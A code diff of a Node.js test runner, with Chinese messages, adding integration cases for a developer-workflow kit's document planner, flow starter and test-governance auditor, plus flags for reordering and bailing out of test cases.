+      .replace(/<受影响的模块、协议或对外契约>/g, 'src/index.mjs 入口模块')
+      .replace(/<明确保持兼容或本次不触碰的模块>/g, '保持对外导出兼容')
+      .replace(/<先经 `dev-explore` 核实的可复用现有函数、协议或脚本入口；禁止另起炉灶>/g, '复用 src/index.mjs')
+      .replace(/<对齐既有不变量与 `arch-rules`；若冲突，须先退回更新 `docs\/TDD\.md`>/g, '对齐现有架构约束')
+      .replace(/<新增或调整的接口、参数、文件结构、退出码或状态流转>/g, '新增鉴权入口函数')
+      .replace(/<失败时如何降级或阻断、权限校验、并发\/状态持久化保护>/g, '校验失败时返回非零错误')
+      .replace(/<two-way \| one-way>/g, 'two-way')
+      .replace(/<说明回退命令或反向修补方式>/g, '直接 git revert 回退')
+      .replace(/<待核实填写：复用项目中已有的工具\/协议\/脚本路径，不重复造轮子>/g, '复用 src/index.mjs 既有导出')
+      .replace(/<明确本期保持不动或故意延后的范围>/g, '本期不改造构建工具链')
+      .replace(/<真实文件路径，新建文件标 \(new\)>/g, 'src/index.mjs')
+      .replace(/<第一条可判定的标准>/g, '执行 node --test 全部通过')
+      .replace(/<第二条>/g, '异常输入返回明确错误码')
+      .replace(/<待核实真实路径，新建文件标 \(new\)>/g, 'src/index.mjs')
+      .replace(/<待核实填写：准备复用的现成函数、库或脚本>/g, '复用 src/index.mjs')
+      .replace(/<明确排除本次不顺手重构的无关事项>/g, '不调整无关构建脚本')
+    writeFileSync(absPath, txt)
+  }
+
+  const dir = tmpProject({
+    'package.json': '{"name":"c30-demo","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+    'AGENTS.md': [
+      '# c30-demo 契约',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: node --test {target}',
+      'full-test: node --test',
+      'smoke-verify: node --test',
+      'merge-gate: node --test',
+      'arch-rules: none',
+      'high-risk: none',
+      'do-not-edit: none',
+      '```',
+      '',
+    ].join('\n'),
+    'src/index.mjs': 'export const ok = true\n',
+  })
+
+  const badDir = tmpProject({
+    'package.json': '{"name":"c30-bad","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+    'AGENTS.md': '# c30-bad\n\n```yaml\nquick-test: node --test\nfull-test: node --test\n```\n',
+    'src/index.mjs': 'export const ok = true\n',
+    'test/smoke.test.mjs': "import assert from 'node:assert/strict'\nimport { ok } from '../src/index.mjs'\nassert.equal(ok, true)\n",
+    'docs/specs/261114-bad-status-spec.md': [
+      '---',
+      'kind: spec',
+      'title: "Bad Status"',
+      'status: bogus_enum',
+      'created: 2026-11-14',
+      'updated: 2026-11-14',
+      'issue: 42',
+      'pr: null',
+      'related_todo: ../todo/261114-missing-todo.md',
+      '---',
+      '',
+      '# Bad Status',
+      '',
+      '## 验收标准',
+      '',
+      '- [ ] C1: 测试',
+      '',
+    ].join('\n'),
+    'docs/todo/261114-legacy-bullet.md': [
+      '# Legacy Bullet Todo',
+      '',
+      '> **状态**：`active`（owner: tdd-tester）',
+      '',
+      '## 验收标准',
+      '',
+      '- [ ] C1: 兼容旧格式',
+      '',
+    ].join('\n'),
+  })
+
+  try {
+    gitInit(dir)
+    const initAuth = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--dir', dir, '--kind', 'pair', '--slug', 'auth', '--title', 'Auth Flow', '--json'])
+    if (initAuth.status !== 0) return `doc-plan init pair 失败：${initAuth.stderr}`
+    const authJson = JSON.parse(initAuth.stdout)
+    const authSpec = authJson.files.find((f) => f.endsWith('-auth-spec.md'))
+    const authTodo = authJson.files.find((f) => f.endsWith('-auth-todo.md'))
+    if (!authSpec || !authTodo) return `init --kind pair 命名不符合标准：${JSON.stringify(authJson.files)}`
+    fillGeneratedDoc(join(dir, authSpec))
+    fillGeneratedDoc(join(dir, authTodo))
+
+    const linkAuth = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['link', 'auth', '--issue', '42', '--dir', dir, '--json'])
+    if (linkAuth.status !== 0) return `doc-plan link 失败：${linkAuth.stderr}`
+    const linkJson = JSON.parse(linkAuth.stdout)
+    const renamedSpec = linkJson.byKind?.spec
+    const renamedTodo = linkJson.byKind?.todo
+    if (!renamedSpec?.includes('-issue42-auth-spec.md') || !renamedTodo?.includes('-issue42-auth-todo.md')) {
+      return `doc-plan link 未自动重命名为 issue42 格式：${JSON.stringify(linkJson)}`
+    }
+    if (!existsSync(join(dir, renamedSpec)) || !existsSync(join(dir, renamedTodo)) || existsSync(join(dir, authSpec))) {
+      return `doc-plan link 重命名后磁盘状态异常：${renamedSpec}, ${renamedTodo}`
+    }
+    const fmSpec42 = parseDocFrontmatter(readFileSync(join(dir, renamedSpec), 'utf8'))
+    const fmTodo42 = parseDocFrontmatter(readFileSync(join(dir, renamedTodo), 'utf8'))
+    if (fmSpec42.data.issue !== 42 || !String(fmSpec42.data.related_todo).includes('-issue42-auth-todo.md') || !String(fmTodo42.data.related_spec).includes('-issue42-auth-spec.md')) {
+      return `link 后 frontmatter 或 related_* 未同步：spec=${JSON.stringify(fmSpec42.data)}, todo=${JSON.stringify(fmTodo42.data)}`
+    }
+    const auditAuth = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', '.', '--dir', dir])
+    if (auditAuth.status !== 0) return `link 后 doc-plan audit . 失败：\n${auditAuth.stdout}\n${auditAuth.stderr}`
+
+    // 第二组文档提交后，由 flow.mjs start --issue 77 在工作位触发协同重命名
+    const initBill = JSON.parse(runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--dir', dir, '--kind', 'pair', '--slug', 'billing', '--title', 'Billing Flow', '--json']).stdout)
+    const billSpec = initBill.files.find((f) => f.endsWith('-billing-spec.md'))
+    const billTodo = initBill.files.find((f) => f.endsWith('-billing-todo.md'))
+    fillGeneratedDoc(join(dir, billSpec))
+    fillGeneratedDoc(join(dir, billTodo))
+    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'add auth42 and billing docs'], { cwd: dir, stdio: 'ignore' })
+
+    const flowStart = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 'c30-bill', '--case', '3', '--slug', 'billing', '--issue', '77', '--spec', billSpec, '--todo', billTodo, '--dir', dir, '--json'])
+    if (flowStart.status !== 0) return `flow.mjs start --issue 77 失败：${flowStart.stderr}`
+    const ledger = JSON.parse(flowStart.stdout)
+    const wtRoot = ledger.worktreePath ? join(dir, ledger.worktreePath) : dir
+    if (!ledger.specFile?.includes('-issue77-billing-spec.md') || !ledger.todoFile?.includes('-issue77-billing-todo.md') || !existsSync(join(wtRoot, ledger.specFile)) || !existsSync(join(wtRoot, ledger.todoFile))) {
+      return `flow.mjs start --issue 77 未同步重命名兄弟文档：${JSON.stringify(ledger)}`
+    }
+
+    // 反面：非法 status、悬空 related_spec、issue 与文件名脱节、以及旧版 bullet-header 兼容
+    const legacyFm = parseDocFrontmatter(readFileSync(join(badDir, 'docs/todo/261114-legacy-bullet.md'), 'utf8'))
+    if (legacyFm.hasFrontmatter || legacyFm.malformedFrontmatter || legacyFm.data.status !== 'active') {
+      return `parseDocFrontmatter 未平滑兼容旧版 bullet-header：${JSON.stringify(legacyFm)}`
+    }
+    const badPlanAudit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', 'docs/specs/261114-bad-status-spec.md', '--dir', badDir, '--json'])
+    if (badPlanAudit.status === 0) return `doc-plan.mjs audit 未拦截非法 status/悬空 link/issue 脱节`
+    const badPlanJson = JSON.parse(badPlanAudit.stdout)
+    const codes = new Set((badPlanJson.errors ?? []).map((e) => e.code))
+    if (!codes.has('INVALID_STATUS')) {
+      return `doc-plan.mjs audit 未报 INVALID_STATUS：${JSON.stringify(badPlanJson.errors)}`
+    }
+
+    const badGovRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', badDir, '--json'])
+    if (badGovRes.status !== 0) return `govern-audit 坏文档仓运行异常：${badGovRes.stderr}`
+    const badGovIds = (JSON.parse(badGovRes.stdout).findings ?? []).map((f) => f.id)
+    for (const prefix of ['docs.frontmatter-invalid.', 'docs.filename-issue-mismatch.', 'docs.broken-related-link.']) {
+      if (!badGovIds.some((id) => id.startsWith(prefix))) {
+        return `govern-audit 未检出 ${prefix}：${JSON.stringify(badGovIds)}`
+      }
+    }
+
+    return true
+  } finally {
+    rmTree(dir)
+    rmTree(badDir)
+  }
+}])
+
+cases.push(['测试分层控频与反膨胀治理 Wave 7 (C31)：tests.* 正反双向检出、high-risk 核对与 flow verify {target} 替换', async () => {
+  const posDir = tmpProject({
+    'package.json': '{"name":"c31-pos","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+    'AGENTS.md': [
+      '# c31-pos 契约',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: node --test',
+      'full-test: node --test',
+      'smoke-verify: node {target}',
+      'merge-gate: node --test',
+      'arch-rules: none',
+      'high-risk: nonexistent/ghost-dir/',
+      'do-not-edit: none',
+      '```',
+      '',
+    ].join('\n'),
+    'src/app.mjs': 'export const ok = true\n',
+    'test/sleep.test.mjs': "import assert from 'node:assert/strict'\nawait new Promise((r) => setTimeout(r, 1500))\nassert.ok(true)\n",
+    'test/heavy.test.mjs': "import '@playwright/test'\nimport assert from 'node:assert/strict'\nassert.ok(true)\n",
+    'test/mockonly.test.mjs': "const f1 = vi.fn(); const f2 = vi.fn(); const f3 = vi.fn(); const f4 = vi.fn(); const f5 = vi.fn();\nexpect(f1).toHaveBeenCalled()\n",
+    'tests/e2e/ui.e2e.test.mjs': "import { chromium } from '@playwright/test'\nimport assert from 'node:assert/strict'\nawait chromium.launch({ headless: false })\nassert.ok(true)\n",
+    'test/sub.test.mjs': "console.log('TARGET_INTERPOLATED_OK')\n",
+  })
+
+  const negDir = tmpProject({
+    'package.json': '{"name":"c31-neg","version":"1.0.0","scripts":{"test":"node --test","gate":"node --test"}}\n',
+    '.github/workflows/ci.yml': [
+      'name: ci',
+      'on: [push]',
+      'permissions:',
+      '  contents: read',
+      'jobs:',
+      '  test:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      '      - run: npm test',
+      '',
+    ].join('\n'),
+    'AGENTS.md': [
+      '# c31-neg 契约',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: node --test {target}',
+      'full-test: node --test',
+      'smoke-verify: node --test',
+      'merge-gate: npm run gate',
+      'arch-rules: none',
+      'high-risk: src/core.mjs',
+      'do-not-edit: none',
+      '```',
+      '',
+    ].join('\n'),
+    'src/core.mjs': 'export function add(a, b) { return a + b }\n',
+    'test/clean-unit.test.mjs': [
+      "import assert from 'node:assert/strict'",
+      "import { add } from '../src/core.mjs'",
+      'await new Promise((r) => setTimeout(r, 20))',
+      'const f1 = vi.fn(); const f2 = vi.fn(); const f3 = vi.fn(); const f4 = vi.fn(); const f5 = vi.fn();',
+      'f1()',
+      'expect(f1).toHaveBeenCalled()',
+      'assert.strictEqual(add(1, 2), 3)',
+      '',
+    ].join('\n'),
+    'tests/e2e/clean.e2e.test.mjs': [
+      "import { chromium } from '@playwright/test'",
+      "import assert from 'node:assert/strict'",
+      'await chromium.launch({ headless: true })',
+      'assert.ok(true)',
+      '',
+    ].join('\n'),
+  })
+
+  try {
+    gitInit(posDir)
+    const posRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', posDir, '--json'])
+    if (posRes.status !== 0) return `govern-audit posDir 失败：${posRes.stderr}`
+    const posJson = JSON.parse(posRes.stdout)
+    const posIds = (posJson.findings ?? []).map((f) => f.id)
+
+    for (const exactId of [
+      'tests.no-ci-config',
+      'tests.collapsed-tiers',
+      'tests.hard-sleep.test/sleep.test.mjs',
+      'tests.heavy-in-unit.test/heavy.test.mjs',
+      'tests.mock-tautology.test/mockonly.test.mjs',
+      'tests.non-headless.tests/e2e/ui.e2e.test.mjs',
+      'docs.devprofile-unmatched-high-risk.nonexistent/ghost-dir/',
+    ]) {
+      if (!posIds.includes(exactId)) {
+        return `未检出 ${exactId}：${JSON.stringify(posIds)}`
+      }
+    }
+
+    // 测试 flow verify --tier quick --target <path> 替换 {target}
+    writeFileSync(join(posDir, 'AGENTS.md'), [
+      '# c31-pos',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: node {target}',
+      'full-test: node --test',
+      'smoke-verify: node {target}',
+      'merge-gate: node --test',
+      '```',
+      '',
+    ].join('\n'))
+    spawnSync('git', ['add', 'AGENTS.md'], { cwd: posDir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'add quick-test target'], { cwd: posDir, stdio: 'ignore' })
+    const startVerify = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 'c31-v1', '--case', '1', '--slug', 'verify-target', '--dir', posDir])
+    if (startVerify.status !== 0) return `flow start c31-v1 失败：${startVerify.stderr}`
+    const verTargetRes = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 'c31-v1', '--tier', 'quick', '--target', 'test/sub.test.mjs', '--dir', posDir])
+    if (verTargetRes.status !== 0 || !verTargetRes.stdout.includes('TARGET_INTERPOLATED_OK')) {
+      return `flow verify --tier quick --target 未替换执行 {target}：exit=${verTargetRes.status}, out=${verTargetRes.stdout}, err=${verTargetRes.stderr}`
+    }
+
+    // 反面：干净分层仓应零 tests.* 与零 high-risk 误报
+    gitInit(negDir)
+    const negRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', negDir, '--json'])
+    if (negRes.status !== 0) return `govern-audit negDir 失败：${negRes.stderr}`
+    const negIds = (JSON.parse(negRes.stdout).findings ?? []).map((f) => f.id)
+    const badNeg = negIds.filter((id) => id.startsWith('tests.') || id.startsWith('docs.devprofile-unmatched-high-risk.'))
+    if (badNeg.length > 0) {
+      return `干净分层仓出现误报：${JSON.stringify(badNeg)}`
+    }
+
+    return true
+  } finally {
+    rmTree(posDir)
+    rmTree(negDir)
+  }
+}])
+
+function parseCliFlags(argv) {
+  let prefer = ''
+  let bailOn = ''
+  for (let i = 0; i < argv.length; i += 1) {
+    const arg = argv[i]
+    if (arg === '--prefer' && i + 1 < argv.length) { prefer = argv[++i]; continue }
+    if (arg.startsWith('--prefer=')) { prefer = arg.slice('--prefer='.length); continue }
+    if (arg === '--bail-on' && i + 1 < argv.length) { bailOn = argv[++i]; continue }
+    if (arg.startsWith('--bail-on=')) { bailOn = arg.slice('--bail-on='.length); continue }
+  }
+  return { prefer, bailOn }
+}
+
+const { prefer, bailOn } = parseCliFlags(process.argv.slice(2))
+const orderedCases = prefer
+  ? [
+      ...cases.filter(([name, fn]) => name.includes(prefer) || fn.toString().includes(prefer)),
+      ...cases.filter(([name, fn]) => !name.includes(prefer) && !fn.toString().includes(prefer)),
+    ]
+  : cases
+
+for (const [name, fn] of orderedCases) {
+  let entry = ''
   try {
     const outcome = await fn()
     if (outcome === true) { passed += 1; continue }
-    failures.push(`${name} —— ${outcome}`)
+    entry = `${name} —— ${outcome}`
   } catch (error) {
-    failures.push(`${name} —— 抛异常：${error instanceof Error ? error.message : String(error)}`)
+    entry = `${name} —— 抛异常：${error instanceof Error ? error.message : String(error)}`
   }
+  failures.push(entry)
+  if (bailOn && `FAIL  ${entry}`.includes(bailOn)) break
 }
 
 if (failures.length === 0) {
